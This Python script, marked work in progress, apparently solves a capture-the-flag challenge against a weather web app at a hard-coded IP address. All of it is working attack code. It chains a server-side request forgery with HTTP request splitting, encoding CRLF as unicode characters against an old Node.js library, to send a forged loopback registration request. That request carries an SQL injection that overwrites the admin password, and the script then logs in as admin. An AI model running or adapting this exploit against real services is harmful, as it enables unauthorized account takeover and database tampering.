#!/usr/bin/python3

# WIP!!!!!

import requests

def login(url, url_login):

    data = {
        'username' : 'admin',
        'password' : 'bigb0ss',
    }

    r = requests.post(url + url_login, data=data)
    print(r.text)

def register(url, url_register):

    data = {
        'username' : 'admin',
        'password' : 'password',
    }

    r = requests.post(url + url_register, data=data)
    print(r.status_code) # It prints out 401 since register is only allowed from the loopback address

def weather(url, url_weather):
    # SSRF + HTTP Splitting against old Node.js lib

    newLine = '\u010D\u010A' 
    space = '\u0120'

    payload = "username=admin&password=pass') ON CONFLICT(username) DO UPDATE SET password='bigb0ss' where username='admin' --"
    payload_parsed = payload.replace(" ", "\u0120").replace("'", "%27").replace('"', "%22")
    contentLength = len(payload_parsed)

    endpoint = '127.0.0.1/' + space + 'HTTP/1.1' + newLine 
    endpoint+= 'Host:' + space + '127.0.0.1' + newLine + newLine
    
    endpoint+= 'POST' + space + '/register' + space + 'HTTP/1.1' + newLine 
    endpoint+= 'HOST:' + space + '127.0.0.1' + newLine 
    endpoint+= 'Content-Type:' + space + 'application/x-www-form-urlencoded' + newLine
    endpoint+= 'Content-Length:' + space + str(contentLength) + newLine + newLine
    
    endpoint+= payload_parsed + newLine + newLine
    
    endpoint+= 'GET' + space + '/?ping='

    headers = { 
        'Content-Type' : 'application/json', 
        }

    r = requests.post(url + url_weather, headers=headers, json={
        "endpoint": endpoint,
        "city": "test",
        "country": "test",
    })
    print(r.status_code)
    #print(r.text)


if __name__ == '__main__':
    url = 'http://188.166.173.208:31822/'

    url_login = "login"
    url_register = "register"
    url_weather = "api/weather"
    
    #register(url, url_register)
    weather(url, url_weather)
    login(url, url_login)